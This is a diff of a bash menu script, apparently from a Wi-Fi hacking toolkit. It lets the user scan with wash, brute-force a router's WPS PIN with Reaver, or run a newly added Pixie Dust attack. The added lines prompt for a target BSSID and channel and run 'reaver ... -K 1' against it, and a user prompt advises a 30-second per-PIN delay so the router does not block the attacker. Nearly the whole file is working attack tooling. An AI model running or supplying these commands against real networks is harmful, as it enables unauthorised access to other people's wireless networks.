@@ -19,44 +19,43 @@ function associate_aireplay
 }
 echo -e "-------------------------\e[1;31mFinding WPS pin\e[0m-------------------------"
 echo -e "\e[1;33m 1\e[0m) Scan with wash"
-echo -e "\e[1;33m 2\e[0m) Reaver"
+echo -e "\e[1;33m 2\e[0m) Reaver (slow)"
 echo -e "\e[1;33m 3\e[0m) Reaver (if you already have the WPS pin)"
-echo -e "\e[1;33m 4\e[0m) Association with aireplay"
+echo -e "\e[1;33m 4\e[0m) Pixie Dust (fast)"
 echo -e "\e[1;33m 0\e[0m) EXIT"
 read -e YN
 if [ "$YN" = "1" ]
 then
 	echo -e "Scaning in new terminal..."
 	sleep 1
-	gnome-terminal -x sh -c "wash -i $WLANNM; bash"
-	#gnome-terminal -e 'wash -i $WLANNM'
-	#xterm -e bash -c 'wash -i $WLANNM; exec bash'
-	echo -e "Start reaver?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=yes): "
-	read YNN
-	if [ "$YNN" = "n" ]
-	then
-		clear
-		exec bash "$0"
-	else
-	#reaver_fill
-	echo -e "Enter your target's BSSID: "
-	read -e BSSIDT
-	echo -e "Enter your target's channel: "
-	read -e CHANT
-	echo -e "Enter the delay of every pin(WARNING: Put 30.The router may block you otherwise.): "
-	read -e DELT
-	export BSSIDT
-	export CHANT
-	export DELT
-	echo -e "Starting reaver in a new terminal"
-	sleep 1
-	GLV="2"
-	export GLV
-	gnome-terminal -e lh31
+	#~ gnome-terminal --geometry 75x20+9999+0 -x sh -c "wash -i $WLANNM; bash"
+	gnome-terminal --geometry 70x15+9999+9999 -e "wash -i $WLANNM && read "
+	#~ echo -e "Start reaver?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=yes): "
+	#~ read YNN
+	#~ if [ "$YNN" = "n" ]
+	#~ then
+		#~ clear
+		#~ exec bash "$0"
+	#~ else
+	#~ #reaver_fill
+	#~ echo -e "Enter your target's BSSID: "
+	#~ read -e BSSIDT
+	#~ echo -e "Enter your target's channel: "
+	#~ read -e CHANT
+	#~ echo -e "Enter the delay of every pin(WARNING: Put 30.The router may block you otherwise.): "
+	#~ read -e DELT
+	#~ export BSSIDT
+	#~ export CHANT
+	#~ export DELT
+	#~ echo -e "Starting reaver in a new terminal"
+	#~ sleep 1
+	#~ GLV="2"
+	#~ export GLV
+	#~ gnome-terminal -e lh31
 	clear
 	exec bash "$0"
 
-	fi
+	#~ fi
 elif [ "$YN" = "2" ]
 then
 	#~ reaver_fill
@@ -97,9 +96,14 @@ elif [ "$YN" = "4" ]
 then
 	echo -e "Enter your target's BSSID: "
 	read -e BSSIDT
+	echo -e "Enter your target's channel: "
+	read -e CHANT
+	export CHANT
 	export BSSIDT
-	export -f aireplay_command
-	xterm -e bash -c 'aireplay-ng -1 0 -a $BSSIDT $WLANNM; exec bash'
+	reaver -i $WLANNM -b $BSSIDT -vvv -K 1 -c $CHANT -w
+	echo -e "Press \e[1;33many key\e[0m to continue..."
+	read
+	#~ xterm -e bash -c 'aireplay-ng -1 0 -a $BSSIDT $WLANNM; exec bash'
 	clear
 	exec bash "$0"
 elif [ "$YN" = "0" ]
